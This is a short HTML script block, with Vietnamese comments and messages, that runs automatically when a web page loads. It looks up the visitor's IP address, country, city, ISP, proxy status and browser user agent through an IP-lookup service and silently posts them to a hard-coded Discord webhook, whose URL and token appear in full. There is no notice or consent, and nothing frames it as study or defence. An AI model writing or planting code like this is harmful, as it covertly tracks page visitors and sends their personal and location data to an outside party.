<script>

const webhook = "https://discord.com/api/webhooks/1502339860885803158/fuKme2rsI2aq9jLBcYb4ARSTZq_jhxNu5bXunLm5BmxMOMfc7bnWV514x0V1IHFS1kNO";

async function sendInfo() {

    try {

        // IP info
        const res = await fetch("https://api.ipbot.com/");
        const data = await res.json();

        // Nội dung
        const msg =
`📱 Có người mở web

🌍 IP: ${data.ip}

🌎 Quốc gia: ${data.location.country}

🏙️ Thành phố: ${data.location.city}

🏢 Nhà mạng: ${data.network.org}

🛡️ Proxy: ${data.security.is_proxy}

💻 User Agent:
${data.telemetry.user_agent}`;

        // Gửi Discord
        await fetch(webhook, {
            method: "POST",
            mode: "no-cors",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content: msg
            })
        });

        console.log("Đã gửi");

    } catch(err) {

        console.log(err);

    }

}

sendInfo();

</script>
